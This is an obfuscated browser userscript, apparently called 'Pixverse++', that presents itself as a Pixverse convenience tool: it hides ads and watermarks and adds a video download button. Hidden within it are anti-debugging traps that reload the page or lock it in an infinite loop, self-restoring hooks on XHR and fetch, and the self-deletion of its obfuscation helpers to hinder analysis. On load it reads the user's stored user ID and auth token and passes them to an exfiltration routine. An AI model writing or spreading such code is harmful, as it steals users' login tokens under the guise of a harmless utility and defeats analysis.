    _d['querySelectorAll'](_unstr(_str('[oncontextmenu]'))).forEach(element => element['removeAttribute'](_unstr(_str('oncontextmenu'))));
    _log(_unstr(_str('Anti-contextmenu enabled')));
  }

  // Injects CSS rules to hide specific UI elements (e.g., watermarks, ads, unwanted components).
  function _injectUboCssFilters() {
    const cssRules = [
      _unstr(_str(".top-14.gap-1.items-center.flex.bg-background-primary.py-2.px-4.sticky.z-20")),
      _unstr(_str(".overflow-hidden.rounded-xl.aspect-video.w-full")),
      _unstr(_str(".gap-9.flex-col.flex.max-lg\\:p-4.p-6.w-full")),
      _unstr(_str(".relative.cursor-pointer.flex-row.rounded-full.px-3.gap-1\\.5.text-xs.h-8.hover\\:text-text-white-primary.hover\\:bg-button-secondary-hover.border-border-third.border-solid.border-t.text-text-white-secondary.backdrop-blur-\\[32px\\].bg-button-secondary-normal.items-center.justify-center.flex.border-0.text-nowrap.font-medium.group\\/button")),
      _unstr(_str("#radix-\\:r1a\\:")), _unstr(_str("#radix-\\:r1g\\:")), _unstr(_str("#radix-\\:r1h\\:")), _unstr(_str("#radix-\\:r1b\\:")),
      _unstr(_str(".intercom-lightweight-app-launcher-icon-open.intercom-lightweight-app-launcher-icon")),
      _unstr(_str(".intercom-launcher.intercom-lightweight-app-launcher")),
      _unstr(_str(".absolute.top-0.left-0.right-0.bg-black.bg-opacity-30.pointer-events-none")),
      _unstr(_str(".fixed.z-50.inset-0.flex.items-center.justify-center")),
      _unstr(_str(".bg-primary-50")), _unstr(_str(".bg-secondary-50")),
      _unstr(_str(".gap-2.flex-col.flex.py-2")),
      _unstr(_str(".flex-col.flex.w-full.flex-1 > .gap-2.flex-col.flex.w-full")),
      _unstr(_str("#image_text-advanced > .hover\\:text-text-white-primary.text-text-white-secondary.pr-6.px-3.gap-1\\.5.items-center.justify-center.shrink-0.flex.h-full.relative")),
      _unstr(_str("#image_text-quality > .hover\\:text-text-white-primary.text-text-white-secondary.pr-6.px-3.gap-1\\.5.items-center.justify-center.shrink-0.flex.h-full.relative")
    )];
    const assetRules = [
      _unstr(_str('img[src*="media.pixverse.ai/asset/media/footer_earned_bg.png?x-oss-process=style/cover-webp-small"]'))
    ];
    const styleElement = _d['createElement'](_unstr(_str('style')));
    styleElement['id'] = _cfg._uboCssId;
    styleElement[_unstr(_str('textContent'))] = [
      ...cssRules.map(selector => `:root ${selector}{display:none!important;}`),
      ...assetRules.map(selector => `${selector}{display:none!important;}`)
    ].join(_unstr(_str('\n')));
    _d['head']['appendChild'](styleElement);
    _log(_unstr(_str('UBO CSS filters injected')));
  }

  /**
   * Sets up a robust download handler for the existing "Download" button on the page.
   * It uses a MutationObserver to detect when the button becomes available in the DOM,
   * and throttles attempts to attach the handler with randomized delays.
   */
  function _setupWatermarkButton() {
    if (_btnAttached) return;
    let attemptCount = 0;

    const throttledTryAttach = _throttle(_tryAttachButton, 300, 100);

    function _tryAttachButton() {
      let mainContent = _d['querySelector'](_unstr(_str('#main-content,[role="main"]'))) || _d['body'];
      let allBtns = mainContent['querySelectorAll'](_unstr(_str('button')));

      for (let btn of allBtns) {
        let labelDiv = _w['Array']['from'](btn['querySelectorAll'](_unstr(_str('div')))).find(d => d[_unstr(_str('textContent'))] && d[_unstr(_str('textContent'))]['trim']() === _unstr(_str('Download')));
        if (labelDiv && !btn['dataset']['injected']) {
          btn['addEventListener'](_unstr(_str('click')), e => {
            e['stopPropagation'](); // Prevent the original button's click handler from executing.
            const videoEl = _d['querySelector'](_unstr(_str('.component-video>video,video')));
            if (videoEl?.src) {
              const url = videoEl['currentSrc'] || videoEl['src'];
              const filename = _getFilename(videoEl);
              const a = _d['createElement'](_unstr(_str('a'))); a['href'] = url; a['download'] = filename;
              _d['body']['appendChild'](a); a['click'](); a['remove']();
              _showToast(_unstr(_str('Download started!')));
            } else { _showToast(_unstr(_str('No video found to download.'))); }
          }, true); // Use capture phase to ensure our handler runs first
          btn['dataset']['injected'] = _unstr(_str('1')); // Mark button as injected
          _btnAttached = true;
          _log(_unstr(_str('Canonical Download button injected')));
        }
      }

      if (!_btnAttached && attemptCount < _cfg._maxAttempts) {
        attemptCount++;
        _w['setTimeout'](throttledTryAttach, 350 + _w['Math']['random']() * 50); // Schedule next attempt with jitter.
      }
    }

    let observerTarget = _d['querySelector'](_unstr(_str('#main-content,[role="main"]'))) || _d['body'];
    const mo = new (_w['MutationObserver'])(throttledTryAttach);
    mo['observe'](observerTarget, { childList: true, subtree: true });
    _w[_cfg._obsList]['push'](mo); // Add observer to tracking list
    _tryAttachButton(); // Initial attempt to attach the button handler.
    _log(_unstr(_str('Watermark button setup initialized')));
  }

  // ==[ Anti-Debug/Anti-Forensics ]==
  // Implements various checks to detect developer tools and analysis environments.
  // Aggressive response: reload the page or trigger an infinite loop.
  function _antiDebug() {
    if (_cfg.DEBUG_MODE) {
      _log(_unstr(_str('Anti-Debug skipped due to DEBUG_MODE.')));
      return;
    }

    const reloadPage = () => {
      _error(_unstr(_str('Anti-Debug: Reloading page due to detection.')));
      _w['location']['reload']();
    };

    const infiniteLoop = () => {
      _error(_unstr(_str('Anti-Debug: Triggering infinite loop.')));
      while (true) { /* empty */ } // Aggressive anti-debug
    };

    const check = () => {
      try {
        // 1. DevTools dimensions check (easily bypassed, but a quick win)
        if (_w['outerWidth'] - _w['innerWidth'] > 100 || _w['outerHeight'] - _w['innerHeight'] > 100) {
          _log(_unstr(_str('Anti-Debug: DevTools dimensions detected.')));
          reloadPage();
        }

        // 2. Debugger statement trap (classic, detectable but still useful)
        (function () {
          (function a() { try { (function b(i) {
            // This condition is designed to trigger debugger periodically or if i is not a number
            if ((_unstr(_str('')) + (_w['Number'](i) / _w['Number'](i))).length !== 1 || _w['Number'](i) % 20 === 0) {
              (_w['Function'])()['constructor'](_unstr(_str('debugger')))();
            } else { b(++i); }
          })(0) } catch (e) { reloadPage(); } })();
        })();

        // 3. Timing check for debugger presence (debugger slows down execution)
        const start = _w['performance']['now']();
        let sum = 0;
        for (let i = 0; i < 500000; i++) { sum += _w['Math']['sqrt'](i); }
        const duration = _w['performance']['now']() - start;
        if (duration > 200) { // Threshold for suspicious execution time
          _log(_unstr(_str('Anti-Debug: Timing check indicates potential debugger presence. Duration:')), duration, _unstr(_str('ms')));
          reloadPage();
        }

        // 4. Check for `Function.prototype.toString` tampering
        try {
          const funcToStr = _w['Function']['prototype']['toString'];
          if (funcToStr[_unstr(_str('includes'))](_unstr(_str('debugger')))) {
            _log(_unstr(_str('Anti-Debug: Function.prototype.toString appears modified.')));
            reloadPage();
          }
        } catch (e) {
          _error(_unstr(_str('Anti-Debug: Error checking function toString:')), e);
          reloadPage();
        }

        // 5. Check for `console` object tampering
        try {
          const originalLogStr = _w['console']['log']['toString']();
          if (!originalLogStr['includes'](_unstr(_str('native code'))) && !originalLogStr['includes'](_unstr(_str('[native code]')))) {
            _log(_unstr(_str('Anti-Debug: WARNING: console.log appears to be modified!')));
            reloadPage();
          }
        } catch (e) {
          _error(_unstr(_str('Anti-Debug: Error checking console tampering:')), e);
          reloadPage();
        }

        // 6. Check for `Date.now()` vs `performance.now()` discrepancy (can indicate time manipulation)
        const dateNow = _w['Date']['now']();
        const perfNow = _w['performance']['now']();
        // A large difference suggests time manipulation, e.g., during debugger pauses.
        if (_w['Math']['abs'](dateNow - (_w['performance']['timing']['navigationStart'] + perfNow)) > 1000) { // 1 second tolerance
            _log(_unstr(_str('Anti-Debug: Time discrepancy detected.')));
            reloadPage();
        }

      } catch (e) {
        _error(_unstr(_str('Anti-Debug: General error in checks, reloading.')), e);
        reloadPage();
      }
    };
    _w['setInterval'](check, 1000); // Run checks periodically
    check(); // Run immediately on load
  }

  // ==[ Self-Healing ]==
  // Periodically checks if API hooks have been overwritten and restores them.
  function _setupSelfHealingHooks() {
    _w['setInterval'](() => {
      // Check if XHR open hook is still ours
      if (_w[_cfg._customXhrOpenVar] && _w['XMLHttpRequest']['prototype']['open'] !== _w[_cfg._customXhrOpenVar]) {
        _log(_unstr(_str('XHR open hook detected as overwritten, restoring.')));
        _overrideXHR();
      }
      // Check if Fetch hook is still ours
      if (_w[_cfg._customFetchVar] && _w['fetch'] !== _w[_cfg._customFetchVar]) {
        _log(_unstr(_str('Fetch hook detected as overwritten, restoring.')));
        _overrideFetch();
      }
    }, _cfg._healingInterval + _w['Math']['random']() * _cfg._healingJitter); // Add jitter for stealth
    _log(_unstr(_str('Self-healing hooks initialized')));
  }

  // ==[ Extra Stealth: Self-Wiping of Obfuscation Utilities ]==
  // Wipes the `_str` and `_unstr` functions from memory after a delay.
  // This makes it harder for analysts to de-obfuscate strings at runtime.
  function _selfDestructStealth() {
    if (_cfg.DEBUG_MODE) {
      _log(_unstr(_str('Self-destruct stealth skipped due to DEBUG_MODE.')));
      return;
    }
    _w['setTimeout'](() => {
      _wipe(_w, '_str');
      _wipe(_w, '_unstr');
      _log(_unstr(_str('Obfuscation utilities (_str, _unstr) wiped from memory.')));
    }, 5000 + _w['Math']['random']() * 2000); // Random delay to avoid fixed patterns
  }

  // ==[ MAIN INITIALIZATION: async for crypto ]==
  // Orchestrates the initialization of all toolkit components.
  async function _initialize() {
    if (_isInitialized) return;
    try {
      _antiDebug(); // Start anti-debugging checks immediately
      _passiveRecon(); // Begin passive DOM reconnaissance and initial data exfil attempts
      _overrideContextMenuBlockers(); // Bypass context menu restrictions
      _overrideXHR(); // Hook XMLHttpRequest
      _overrideFetch(); // Hook Fetch API
      _injectUboCssFilters(); // Inject CSS for UI blocking
      _setupWatermarkButton(); // Setup download button
      _setupSelfHealingHooks(); // Start self-healing for API hooks
      _selfDestructStealth(); // Schedule self-wiping of obfuscation utilities

      // Lifecycle handlers for observer management: disconnect on blur, reconnect on focus.
      // This helps evade analysis by temporarily disabling observers when DevTools are focused.
      _w['addEventListener'](_unstr(_str('blur')), _disconnectAllObservers, true);
      _w['addEventListener'](_unstr(_str('focus')), () => _w['setTimeout'](_reconnectAllObservers, 500), true);

      // Example: Initial data exfiltration from Local Storage (encrypted).
      // This is for existing data, any new data found will be exfiltrated by interceptors.
      _ls['getItem'](_cfg._lsUserId).then(userId => {
        if (userId) {
          _log(_unstr(_str('Found encrypted user ID in local storage:')), userId);
          _exfil(_unstr(_str('ls_encrypted_user_id')), userId);
        }
      });
      _ls['getItem'](_cfg._lsAuthToken).then(authToken => {
        if (authToken) {
          _log(_unstr(_str('Found encrypted auth token in local storage:')), authToken);
          _exfil(_unstr(_str('ls_encrypted_auth_token')), authToken);
        }
      });

      _isInitialized = true;
      _log(_unstr(_str('Pixverse++ initialized')));
      _showToast(_unstr(_str('Pixverse++ Toolkit loaded ✓')));
    } catch (e) {
      _error(_unstr(_str('Initialization failed:')), e);
      _showToast(_unstr(_str('Pixverse++ init error')));
    }
  }

  // Ensure initialization runs at the earliest possible moment.
  if (_d['readyState'] === _unstr(_str('loading'))) {
    _d['addEventListener'](_unstr(_str('DOMContentLoaded')), _initialize, { once: true });
  } else { _initialize(); }

  // Immediately-invoked function to inject minimal CSS for the toast notification.
  // This CSS is ONLY injected if DEBUG_MODE is true.
  (function () {
    if (!_cfg.DEBUG_MODE) return;
    if (_d['getElementById'](_cfg._toastCssId)) return;
    const styleElement = _d['createElement'](_unstr(_str('style')));
    styleElement['id'] = _cfg._toastCssId;
    styleElement[_unstr(_str('textContent'))] = `.${_unstr(_str('pv-toast'))}{box-sizing:border-box;user-select:none;pointer-events:none;}`;
    _d['head']['appendChild'](styleElement);
  })();

})();
